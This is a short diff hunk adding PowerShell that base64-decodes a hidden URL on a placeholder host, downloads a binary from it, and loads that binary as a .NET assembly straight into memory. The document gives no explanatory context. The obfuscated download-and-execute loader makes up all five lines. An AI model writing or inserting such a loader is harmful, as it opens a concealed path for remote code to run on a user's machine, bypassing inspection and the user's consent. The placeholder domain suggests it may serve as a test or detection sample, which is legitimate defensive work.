@@ -1,0 +1,5 @@
+$client = New-Object System.Net.WebClient
+$remote = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9wNC1tb2R1bGVzLmV4YW1wbGUuaW52YWxpZC9lbXB0eS1hc3NlbWJseS5iaW4='))
+$octets = $client.DownloadData($remote)
+$assembly = [Reflection.Assembly]::Load($octets)
+$null = $assembly.FullName
